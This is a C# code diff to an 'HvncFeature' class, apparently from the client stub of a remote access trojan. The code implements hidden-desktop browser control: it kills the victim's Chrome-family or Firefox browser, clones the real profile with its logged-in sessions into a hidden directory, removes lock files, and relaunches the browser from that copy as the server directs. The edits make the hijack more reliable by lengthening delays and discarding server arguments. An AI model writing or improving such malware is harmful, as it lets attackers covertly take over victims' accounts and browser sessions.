@@ -1851,6 +1851,7 @@ internal static class HvncFeature
                 }
             }
             else if (!_multiInstance.Contains(exeBase) &&
+                     !_chromiumBrowsers.Contains(exeBase) && exeBase != "firefox.exe" &&
                      _launchedPids.TryGetValue(exeBase, out uint existingPid) && IsProcessAlive(existingPid))
             {
                 StubLog.Info($"[HVNC] '{exeBase}' already running (pid={existingPid}), skipping");
@@ -1907,7 +1908,7 @@ internal static class HvncFeature
                 if (realProfile != null && Directory.Exists(realProfile))
                 {
                     KillProcessByName(exeBase);
-                    Thread.Sleep(500);
+                    Thread.Sleep(800);
                     try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, recursive: true); } catch { }
                     CloneProfileToDir(realProfile, hvncProfile);
                     StubLog.Info($"[HVNC] Profile cloned '{realProfile}' → '{hvncProfile}'");
@@ -1959,7 +1960,7 @@ internal static class HvncFeature
                 if (realProfile != null && Directory.Exists(realProfile))
                 {
                     KillProcessByName("firefox.exe");
-                    Thread.Sleep(500);
+                    Thread.Sleep(800);
                     try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, true); } catch { }
                     CloneProfileToDir(realProfile, hvncProfile);
                     StubLog.Info($"[HVNC] Firefox profile cloned '{realProfile}' → '{hvncProfile}'");
@@ -1970,13 +1971,10 @@ internal static class HvncFeature
                 }
                 foreach (var lk in new[] { "parent.lock", "lock" })
                     try { File.Delete(Path.Combine(hvncProfile, lk)); } catch { }
-                // Replace existing -profile flag in cmd (server sends one pointing to old temp dir)
-                int pIdx = cmd.IndexOf("-profile ", StringComparison.OrdinalIgnoreCase);
-                if (pIdx >= 0)
-                {
-                    int eIdx = cmd.IndexOf(" -", pIdx + 9);
-                    cmd = (eIdx >= 0 ? cmd[..pIdx] + cmd[eIdx..] : cmd[..pIdx]).TrimEnd();
-                }
+                // Drop all server-supplied args — keep only the exe path, then add ours.
+                // Avoids fragile -profile argument parsing with potentially space-containing paths.
+                int ffSpace = cmd.IndexOf(' ');
+                if (ffSpace >= 0) cmd = cmd[..ffSpace];
                 cmd += $" -profile \"{hvncProfile}\" -no-remote";
             }
             // Repair real Opera / Opera GX profile JSON before launch.
